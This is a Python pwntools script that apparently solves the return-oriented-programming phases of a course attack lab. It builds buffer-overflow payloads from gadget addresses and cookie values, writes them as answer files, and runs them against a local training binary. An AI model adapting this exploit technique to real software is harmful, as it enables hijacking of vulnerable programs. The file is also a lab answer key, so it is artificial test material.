from pwn import *
import keystone

def save_answer(answer: bytes, filename: str):
    # Two bytes and a space
    with open(filename, 'w') as f:
        for i in range(0, len(answer), 8):
            chunk = answer[i:i+8]
            hex_line = ' '.join(f'{b:02x}' for b in chunk)
            f.write(hex_line + '\n')


def touch2():
    payload = b'A' * 0x38
    payload += p64(0x808c10) # Gadget to set rax (pop rax ; ret)
    payload += p64(0x2ce1a21a) # Cookie value
    payload += p64(0x808c07)  # Gadget to move rax to rdi (mov rdi, rax ; ret)
    payload += p64(0x808a46)  # Address of touch2
    save_answer(payload, 'src/rtarget02.txt')
    
    # Start the process and send the payload
    
    p = process('./rtarget')
    p.sendline(payload)
    p.interactive()
    p.close()
    return

def touch3():
    payload = b'A' * 0x38
    payload += p64(0x808c10) # Gadget to set rax (pop rax ; ret) 
    payload += p64(0x60) # Offset in rsp to get to our cookie string
    payload += p64(0x808ca8) # Gadget to move eax to ecx (mov ecx, eax ; ret)
    payload += p64(0x808cfb) # Gadget to move ecx to edx (mov edx, ecx ; nop ; ret)
    payload += p64(0x808c54) # Gadget to move edx to esi (mov esi, edx ; or bl, bl ; ret)
    payload += p64(0x808c41) # mov rax, rsp ; ret
    payload += p64(0x808c07) # Gadget to move rax to rdi (mov rdi, rax ; ret)
    payload += p64(0x808c3a) # (lea rax, [rdi + rsi]; ret)
    payload += p64(0x808c07) # Gadget to move rax to rdi (mov rdi, rax ; ret)
    payload += p64(0x808b5d)  # Address of touch3
    payload += b'A' * 64  # Padding to reach the cookie string
    payload += b'2ce1a21a'  # Cookie value as string
    save_answer(payload, 'src/rtarget03.txt')
    
    # Start the process and send the payload
    
    p = process('./rtarget')
    p.sendline(payload)
    p.interactive()
    p.close()
    return

if __name__ == "__main__":
    touch2()
    touch3()